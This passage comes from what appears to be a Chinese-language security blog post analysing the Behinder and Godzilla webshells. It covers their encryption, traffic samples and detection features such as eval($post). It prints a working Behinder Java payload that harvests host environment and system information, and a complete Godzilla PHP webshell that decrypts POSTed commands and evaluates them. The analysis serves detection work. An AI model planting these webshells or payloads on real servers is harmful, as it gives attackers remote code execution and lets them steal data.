class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.PageContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: 1.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicInfo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="type">PageContext</span> <span class="variable">page</span> <span class="operator">=</span> (PageContext) obj;</span><br><span class="line">        <span class="comment">// 设置响应的编码</span></span><br><span class="line">        page.getResponse().setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">basicInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&lt;br/&gt;&lt;font size=2 color=red&gt;环境变量:&lt;/font&gt;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            Map&lt;String, String&gt; env = System.getenv();</span><br><span class="line">            <span class="keyword">for</span> (String name : env.keySet()) &#123;</span><br><span class="line">                basicInfo.append(String.valueOf(name) + <span class="string">&quot;=&quot;</span> + env.get(name) + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            basicInfo.append(<span class="string">&quot;&lt;br/&gt;&lt;font size=2 color=red&gt;JRE系统属性:&lt;/font&gt;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取系统属性</span></span><br><span class="line">            <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> System.getProperties();</span><br><span class="line">            Set&lt;Map.Entry&lt;Object, Object&gt;&gt; entrySet = props.entrySet();</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Object, Object&gt; entry : entrySet) &#123;</span><br><span class="line">                <span class="comment">// 添加到Entry里面</span></span><br><span class="line">                basicInfo.append(entry.getKey() + <span class="string">&quot; = &quot;</span> + entry.getValue() + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 返回文件的绝对路径，如果构造的时候是全路径就直接返回全路径，如果构造时是相对路径，就返回当前目录的路径 + 构造 File 对象时的路径</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">currentPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;&quot;</span>).getAbsolutePath();</span><br><span class="line">            <span class="type">String</span> <span class="variable">driveList</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">// File.listRoots():返回所有可用文件 System root 的根目录</span></span><br><span class="line">            File[] roots = File.listRoots();</span><br><span class="line">            <span class="keyword">for</span> (File f : roots) &#123;</span><br><span class="line">                driveList = String.valueOf(driveList) + f.getPath() + <span class="string">&quot;;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 获取系统版本</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">osInfo</span> <span class="operator">=</span> String.valueOf(System.getProperty(<span class="string">&quot;os.name&quot;</span>)) + System.getProperty(<span class="string">&quot;os.version&quot;</span>) + System.getProperty(<span class="string">&quot;os.arch&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Entity</span></span><br><span class="line">            Map&lt;String, String&gt; entity = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            <span class="comment">// 将基本信息转换为字符串</span></span><br><span class="line">            entity.put(<span class="string">&quot;basicInfo&quot;</span>, basicInfo.toString());</span><br><span class="line">           	<span class="comment">// 当前路径</span></span><br><span class="line">            entity.put(<span class="string">&quot;currentPath&quot;</span>, currentPath);</span><br><span class="line">            <span class="comment">// 盘符</span></span><br><span class="line">            entity.put(<span class="string">&quot;driveList&quot;</span>, driveList);</span><br><span class="line">            <span class="comment">// 系统基本信息</span></span><br><span class="line">            entity.put(<span class="string">&quot;osInfo&quot;</span>, osInfo);</span><br><span class="line">            <span class="comment">// 将上面构造好的entity转换为json对象</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> buildJson(entity, <span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 将session中获取的key转换为字符串</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> page.getSession().getAttribute(<span class="string">&quot;u&quot;</span>).toString();</span><br><span class="line">            <span class="comment">// 拿到页面响应并构造输出</span></span><br><span class="line">            <span class="type">ServletOutputStream</span> <span class="variable">so</span> <span class="operator">=</span> page.getResponse().getOutputStream();</span><br><span class="line">            <span class="comment">// 获取构造好的json对象的字节流,并加密,Key为session中的key</span></span><br><span class="line">            so.write(Encrypt(result.getBytes(), key));</span><br><span class="line">            <span class="comment">// 刷新</span></span><br><span class="line">            so.flush();</span><br><span class="line">            <span class="comment">// 关闭so对象</span></span><br><span class="line">            so.close();</span><br><span class="line">            <span class="comment">// 清除页面输出</span></span><br><span class="line">            page.getOut().clear();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 输出异常错误</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 加密函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Encrypt(<span class="type">byte</span>[] bs, String key) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// getBytes()方法将 String编码为字节序列并返回一个字节数组. 其中 charsetName是将String 编码为字节数组的特定字符集</span></span><br><span class="line">        <span class="type">byte</span>[] raw = key.getBytes(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 此类以独立于提供者的方式指定密钥. 它可用于从字节数组构造SecretKey,而无需通过(基于提供程序的) SecretKeyFactory.此类仅对可以表示为字节数组且没有与之关联的关键参数的原始密钥有用,例如DES或Triple DES密钥</span></span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">skeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(raw, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="comment">// 参数按&quot;AES/无向量模式/填充模式</span></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS5Padding&quot;</span>);</span><br><span class="line">        <span class="comment">/*  init(int opmode, Key key, AlgorithmParameterSpec params)</span></span><br><span class="line"><span class="comment">			1. opmode:Cipher.ENCRYPT_MODE(加密模式)和Cipher.DECRYPT_MODE(解密模式)</span></span><br><span class="line"><span class="comment">			2. key:密匙,使用传入的盐构造出一个密匙,可以使用SecretKeySpec、KeyGenerator和KeyPairGenerator创建密匙,其中 </span></span><br><span class="line"><span class="comment">				SecretKeySpec和KeyGenerator支持AES，DES，DESede三种加密算法创建密匙</span></span><br><span class="line"><span class="comment">				KeyPairGenerator支持RSA加密算法创建密匙</span></span><br><span class="line"><span class="comment">			3. params:使用CBC模式时必须传入该参数,该项目使用IvParameterSpec创建iv对象</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        cipher.init(<span class="number">1</span>, skeySpec);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        byte[] b = cipher.doFinal(content);</span></span><br><span class="line"><span class="comment">		返回结果为byte数组，如果直接使用 new String(b) 封装成字符串，则会出现乱码</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">byte</span>[] encrypted = cipher.doFinal(bs);</span><br><span class="line">        <span class="keyword">return</span> encrypted;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">buildJson</span><span class="params">(Map&lt;String, String&gt; entity, <span class="type">boolean</span> encode)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">version</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String key : entity.keySet()) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;\&quot;&quot;</span> + key + <span class="string">&quot;\&quot;:\&quot;&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> entity.get(key).toString();</span><br><span class="line">            <span class="keyword">if</span> (encode) &#123;</span><br><span class="line">                <span class="keyword">if</span> (version.compareTo(<span class="string">&quot;1.9&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    getClass();</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">Base64</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> Base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(Base64, <span class="literal">null</span>);</span><br><span class="line">                    <span class="comment">// 反射</span></span><br><span class="line">                    value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder, value.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    getClass();</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">Encoder2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>).newInstance();</span><br><span class="line">                    value = ((String) Encoder2.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder2, value.getBytes(<span class="string">&quot;UTF-8&quot;</span>))).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(value);</span><br><span class="line">            sb.append(<span class="string">&quot;\&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sb.setLength(sb.length() - <span class="number">1</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到上方主要是用来获取系统的相关信息,由于运行环境不同,得到的内容也是不同的<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312012043.png#id=yrYWz&originHeight=540&originWidth=1887&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312053019.png#id=kvCCD&originHeight=609&originWidth=1777&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<h3 id="冰蝎-V3"><a href="#冰蝎-V3" class="headerlink" title="冰蝎 V3"></a>冰蝎 V3</h3><ol>
+<li><p>3.0 相比 2.0 少了动态密钥的获取的请求,aes 密钥变为 md5(“pass”)[0:16]意思为连接密码 32 位 md5 的前 16 位.全程不再交互密钥生成,一共就俩次请求，第一次请求为判断是否可以建立连接，少了俩次 get 获取冰蝎动态密钥的行为，第二次发送 phpinfo 等代码执行，获取网站的信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311644063.png#id=sp4dp&originHeight=72&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>流量如下: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312117323.png#id=MWazf&originHeight=704&originWidth=1802&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>解密后:<br><strong>将以上内容进行解码</strong>,得到以下内容,发现执行了<code>phpinfo()</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312119696.png#id=HGGKL&originHeight=915&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+</li>
+<li><p>找到对应的shell3.php将密钥取出来就可以对响应的流量进行aes解密</p>
+</li>
+</ol>
+<h3 id="冰蝎-V4"><a href="#冰蝎-V4" class="headerlink" title="冰蝎 V4"></a>冰蝎 V4</h3><ol>
+<li>客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端； </li>
+<li>服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令； </li>
+<li>执行结果通过AES加密后返回给攻击者。</li>
+</ol>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311745329.png#id=W2Vye&originHeight=859&originWidth=849&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312129735.png#id=izP5J&originHeight=1015&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol start="4">
+<li><p>常见特征 </p>
+</li>
+<li><p>流量特征 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$post=Decrypt(file_get_contents(&quot;php://input&quot;));</span><br><span class="line">eval($post);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>检测思路<br>content字段中，将eval($post)作为流量特征纳入 </p>
+</li>
+<li><p>冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection.<code>Connection: Keep-Alive</code> </p>
+</li>
+<li><p>找到webshell后可以相应的找到解密函数,以及加密函数</p>
+</li>
+</ol>
+<h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><h3 id="PHP-XOR-BASE64加密shell分析"><a href="#PHP-XOR-BASE64加密shell分析" class="headerlink" title="PHP_XOR_BASE64加密shell分析"></a>PHP_XOR_BASE64加密shell分析</h3><p>哥斯拉的Shell配置包括<code>基本配置</code>和<code>请求配置</code>。其中<code>基本配置</code>主要设置shell地址、密码、密钥、加密器等信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211012250830.png#id=lLLIj&originHeight=692&originWidth=620&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>这里要注意<code>密码</code>和<code>密钥</code>的不同：<br><code>密码</code>：和蚁剑、菜刀一样，<code>密码</code>就是POST请求中的参数名称。例如，在本例中密码为<code>pass</code>，那么哥斯拉提交的每个请求都是<code>pass=xxxxxxxx</code>这种形式<br><code>密钥</code>：用于对请求数据进行加密，不过加密过程中并非直接使用<code>密钥</code>明文，而是计算<code>密钥</code>的md5值，然后取其<strong>前16位</strong>用于加密过程<br>哥斯拉shell的<code>请求配置</code>主要用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征</p>
+<h4 id="Shell服务端代码"><a href="#Shell服务端代码" class="headerlink" title="Shell服务端代码"></a>Shell服务端代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 启动一个session</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 加密(解密)函数</span></span><br><span class="line"><span class="comment">// 流程: 将加密数据与密钥按位异或,即可加密(解密)得到加密数据(原始数据)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Shell的密码,即POST请求的参数名</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="comment">// 加/解密的密钥,等于Shell密钥的md5值的前16位</span></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">	<span class="comment">// 先解密请求数据</span></span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="comment">// 存在名为payload的session,则从session中提取攻击载荷,然后解密请求数据作为操作命令并执行</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    <span class="comment">// 如果不存在,则将请求数据解密得到攻击载荷,存入session中</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
